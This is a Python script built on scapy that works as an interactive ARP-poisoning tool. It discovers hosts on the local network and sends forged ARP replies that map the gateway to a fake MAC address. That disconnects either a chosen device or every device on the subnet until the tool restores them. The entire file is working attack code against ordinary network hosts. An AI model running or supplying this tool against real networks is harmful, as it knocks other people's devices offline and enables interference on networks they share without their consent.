#!/usr/bin/python

import socket, os, sys, urllib, re, subprocess, threading
from scapy.all import *


if os.getuid() != 0:
	print "You Need Root Privileges"
	sys.exit()

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class colors:
    purple = '\033[95m'
    blue = '\033[94m'
    green = '\033[92m'
    warning = '\033[93m'
    fail = '\033[91m'
    end = '\033[0m'
    bold = '\033[1m'
    underline = '\033[4m'

def intermittent_dots(sentence):
	for i in range(1,4):
		print sentence + i*'.'
		time.sleep(0.7)
		sys.stdout.write('\033[F')
		sys.stdout.write('\033[K')
	
def get_external_ip():
	# this takes time, instead -> subprocess.check_output("curl --fail --silent --show-error ipecho.net/plain ; echo", shell = True)
	text = urllib.urlopen('http://www.whatismyip.org').read()
	urlRE=re.findall('[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}',text)
	return urlRE
	
def get_ip_macs(ips):
  answers, uans = arping(ips, verbose=0)
  res = {}
  for answer in answers:
    mac = answer[1].hwsrc
    ip  = answer[1].psrc
    res[ip] = mac
  return res # Tuple (ip, mac address)

def get_lan_ip():
  # Better to use -> socket.gethostbyname(socket.gethostname())
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("google.com", 80))
  ip = s.getsockname()
  s.close()
  return ip[0]

class main():
	
	def __init__(self):
		self.count = 0
		self.myip = get_lan_ip()
		self.ip_list = self.myip.split('.')
		del self.ip_list[-1]
		self.ip_list.append('*')
		self.ip_range = '.'.join(self.ip_list)
		del self.ip_list[-1]
		self.ip_list.append('1')
		self.gateway_ip = '.'.join(self.ip_list)
				
		self.poisoned_devices = {}
		self.devices = get_ip_macs(self.ip_range)
		self.kill_all = False

		self.external_ip = subprocess.check_output("curl --fail --silent --show-error ipecho.net/plain ; echo", shell = True).strip()
		self.gateway_mac = subprocess.check_output("arp -a | grep '(192.168.1.1)' | awk '{print $4}'", shell = True).strip()
		self.own_mac_address = subprocess.check_output("ifconfig | grep 'ether' | awk '{print $2}'", shell = True).split("\n")[0]
	
	def status(self):
		print colors.bold + colors.underline + "\nDevice Status:\n" + colors.end
		print "MAC address: ", self.own_mac_address
		print "Lan IP:      ", socket.gethostbyname(socket.gethostname())
		print "External IP: ", self.external_ip
		print  colors.bold + colors.underline + "\nNet Status:\n" + colors.end
		print "Gateway IP:  ", self.gateway_ip
		print "Gateway MAC: ", self.gateway_mac.strip()
		print "\nList Of Machines On The Net: "
		for ip, mac in self.devices.iteritems():
			self.count += 1
			print "{:d} --> [{:12} -- {}]".format(self.count, ip, mac)
		print	
		"""
			if str(self.gateway_ip) == str(ip):
				self.gateway_mac2 = mac.strip()
		print
		if self.gateway_mac == self.gateway_mac2:
			pass
		else:
			print "Couldn't Get The Default Gateway Mac"
			sys.exit()
		"""

	def restore(self, victim_ip, victim_mac, gateway_ip, gateway_mac):
		packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
		send(packet, verbose=0) #copy

	def poison(self, victim_ip, victim_mac, gateway_ip):
		while self.kill_all == False:
  			packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
  			send(packet, verbose=0) #copy
		return #copy

	def poison_all(self):
		if self.devices:
			for ip, mac in self.devices.iteritems():
				try:
					while True:
						intermittent_dots('>> Poisoning All Devices On The Net')
						packet = ARP(op=2, psrc=self.gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=ip, hwdst=mac)
  						send(packet, verbose=0)
				except KeyboardInterrupt:
					print ''
					sys.stdout.write('\033[F')
					sys.stdout.write('\033[K')
					intermittent_dots('>> Restoring Connections',)
					for ip, mac in self.devices.iteritems():
						self.restore(ip, mac, self.gateway_ip, self.gateway_mac)
					print '>> All Devices Restored'
					break
		else:
			print '>> There Are No Devices On The Net'		
	
	def poison_device(self):
		print ">> Enter The IP Or Its Position To Poison It" 
		while True:
			try:
				input = raw_input("> ")
				if input != '' and input.isdigit() and len(input) < 3 and int(input) <= self.count:
					ip_to_poison = self.devices.items()[int(input)-1][0]
					mac_to_poison = self.devices.items()[int(input)-1][1]
				elif len(input) == 11 or len(input) == 12:
					if input in self.devices.keys():
						ip_to_poison = input
						mac_to_poison = self.devices[input]
				else:
					continue
				decision = raw_input('>> ' + colors.fail + colors.bold + 'Are You Sure You Want To Poison This Device? [{}]\n'.format(ip_to_poison) + colors.end)
				if decision.lower() == 'no':
					print '>> Device Not Poisoned'
				elif decision.lower() == 'yes':
					print '>> Poisoning Device ..'
					thread = threading.Thread(target=self.poison, args=(ip_to_poison, mac_to_poison, self.gateway_ip))
					thread.start()
					self.poisoned_devices[ip_to_poison] = mac_to_poison
					print '>> Device Poisoned'
				else:
					print '>> You Didn\'t Introduce A Valid Response'
					continue
			except KeyboardInterrupt:
				print "\n\n>> Exiting Poisone Mode .."
				print ">> Number Of Active Threads Poisoning:", threading.activeCount()-1, "\n"
				break
		
	def restore_device(self):
		mac_to_restore = 0
		ip_to_restore = 0
		
		if not self.poisoned_devices:
			print '>> There Are No Poisoned Devices'
		elif self.poisoned_devices:
			print '\n' + colors.bold + colors.underline + 'Poisoned Devices:' + colors.end + '\n'
			for ip, mac in self.poisoned_devices.iteritems():
				number = 1
				print '{:d} --> [{:12} -- {}]'.format(number, ip, mac)
				number += 1
			print 
			print '>> Enter The IP Or Its Position To Restore It'
			while self.poisoned_devices:
				try:
					choice = raw_input('> ')
					if choice.strip() != '' and len(choice) < 3 and int(choice) <= number:
						ip_to_restore = self.poisoned_devices.items()[int(choice)-1][0]
						mac_to_restore = self.poisoned_devices.items()[int(choice)-1][1]
					elif len(choice) == 11 or len(choice) == 12:
						if choice in self.devices.keys():
							ip_to_restore = choice
							mac_to_restore = self.poisoned_devices[choice]
					else:
						continue
					if mac_to_restore != 0 and ip_to_restore != 0:
						self.kill_all = True
						time.sleep(2)
						self.restore(ip_to_restore, mac_to_restore, self.gateway_ip, self.gateway_mac)
						print colors.green + colors.bold + '>> The Connection Of [{0}] Has Been Restored'.format(ip_to_restore) + colors.end
						del self.poisoned_devices[ip_to_restore]
						self.kill_all = False
					
					if self.poisoned_devices:
						for ip, mac in self.poisoned_devices.iteritems():
							thread = threading.Thread(target=self.poison, args=(ip, mac, self.gateway_ip))
							thread.start()

				except KeyboardInterrupt:
					print "\n\n>> Exiting Restore Mode .."
					print ">> Number Of Active Threads Poisoning:", threading.activeCount()-1, "\n"
					break

if __name__ == "__main__":
	while True:
		Program = main()
		Program.status()
		choice = 0
		while choice != '-p' or choice != '-r' or choice != '-f':
			try:
				choice = raw_input(">> Poison (-p (all)), Restore (-r) Or Refresh (-f)? ")
				if choice == '-p':
					Program.poison_device()
				elif choice == '-p all':
					Program.poison_all()
				elif choice == '-r':
					Program.restore_device()
				elif choice == '-f':
					break
			except KeyboardInterrupt:
				print "\n>> Exiting Program .."
				active_threads = threading.activeCount() - 1
				kill_all = True
				print ">> All Connections Restablished! ({:d})\n".format(active_threads)
				sys.exit()